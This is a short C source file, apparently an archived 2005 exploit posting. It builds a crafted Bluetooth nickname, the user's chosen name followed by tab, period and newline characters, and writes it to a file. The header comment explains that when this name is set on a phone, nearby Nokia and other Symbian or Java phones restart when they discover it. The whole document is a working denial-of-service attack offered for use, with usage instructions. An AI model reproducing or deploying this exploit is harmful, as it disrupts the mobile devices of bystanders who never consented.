/*
      Nokia Bluetab Exploit 
      Found & coded by Qnix
 
 - This Exploit will creat file called bluetab.txt with your 
   bluetooth nickname, send the file to your nokia mobile
   open it copy the nickname and paste it to your bluetooth
   nickname, if any one search and find your nickname his
   mobile will restart .
 - this exploit work on many other symbian and java mobiles .

   Qnix - [email protected]

*/

#include <stdio.h>
#define  tab1 0x09
#define  tab2 0x2E
#define  dot1 0x0A

int main(int argc,char *argv[])
{

 FILE *bluetab;

 if(argc < 2)
 { 
   msgm();
   printf("Useage : ./bluetab <nickname>\n");
   return 0;
 } 
 else
 { 
   msgm();
   printf("bluetab.txt file created with your nickname . \n");
 }
 
 bluetab = fopen("bluetab.txt","w");
 if(!bluetab)
 {
   msgm();  
   printf("Some kind of file error!\n");
   return 0;
 }

 
 fprintf(bluetab,"%s%c%c%c",argv[1],tab1,tab2,dot1); 
 fclose(bluetab);
 return 0;
 
}

msgm()
{

  printf(" ------------------------------- \n");
  printf("     Nokia Bluetab Exploit       \n");
  printf("       found & coded by          \n");
  printf("       [email protected]          \n");
  printf(" ------------------------------- \n\n");
}

/* v1 2005-03-04 milw0rm.com */
